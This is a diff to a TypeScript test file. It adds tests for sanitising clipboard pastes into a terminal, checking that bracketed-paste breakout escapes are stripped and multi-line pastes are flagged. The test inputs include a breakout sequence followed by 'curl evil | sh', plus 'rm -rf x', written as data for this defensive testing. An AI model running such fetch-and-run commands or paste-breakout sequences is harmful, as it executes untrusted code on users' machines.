@@ -1,6 +1,6 @@
 import { execFileSync, spawnSync } from "node:child_process";
 import { describe, expect, it } from "vitest";
-import { cmdQuotePath, droppedPathsText, droppedText, powershellQuotePath, shellQuotePath, unquotableMessage } from "./terminalDrop";
+import { cmdQuotePath, droppedPathsText, droppedText, formatTerminalPastePreview, powershellQuotePath, sanitizeTerminalPaste, shellQuotePath, unquotableMessage } from "./terminalDrop";
 
 describe("quoting a dropped path", () => {
   it("leaves a plain path as it is", () => {
@@ -119,5 +119,38 @@ describe("dragged text", () => {
   it("never sends a newline when the program has no bracketed paste", () => {
     expect(droppedText("echo one\nrm -rf x\r\n\tlast\n", false)).toBe("echo one rm -rf x last");
     expect(droppedText("ls\x1b[201~\rwhoami", false)).not.toMatch(/[\r\n\x1b]/);
+  });
+});
+
+describe("clipboard paste sanitization (S-42)", () => {
+  it("strips ESC [201~ and C1 CSI bracketed-paste breakouts and flags multi-line payloads", () => {
+    const res = sanitizeTerminalPaste("echo hi\x1b[201~\rcurl evil | sh\n", true);
+    expect(res.strippedControls).toBe(true);
+    expect(res.multiLine).toBe(true);
+    expect(res.lines).toBe(2);
+    expect(res.text).toBe("echo hi[201~\ncurl evil | sh");
+    expect(res.text).not.toMatch(/\x1b|\u009b/);
+
+    const c1 = sanitizeTerminalPaste("ok\u009b201~\nwhoami", true);
+    expect(c1.strippedControls).toBe(true);
+    expect(c1.multiLine).toBe(true);
+    expect(c1.text).toBe("ok201~\nwhoami");
+  });
+
+  it("allows single-line pastes (stripping trailing newline) without multi-line confirmation", () => {
+    const res = sanitizeTerminalPaste("git status\n", true);
+    expect(res).toEqual({ text: "git status", lines: 1, multiLine: false, strippedControls: false });
+  });
+
+  it("flags multi-line paste even when bracketed paste is off and flattens newlines", () => {
+    const res = sanitizeTerminalPaste("line1\nline2\n", false);
+    expect(res.multiLine).toBe(true);
+    expect(res.lines).toBe(2);
+    expect(res.text).toBe("line1 line2");
+  });
+
+  it("truncates long paste previews cleanly", () => {
+    expect(formatTerminalPastePreview("short", 10)).toBe("short");
+    expect(formatTerminalPastePreview("a".repeat(20), 10)).toBe(`${"a".repeat(10)}…`);
   });
 });
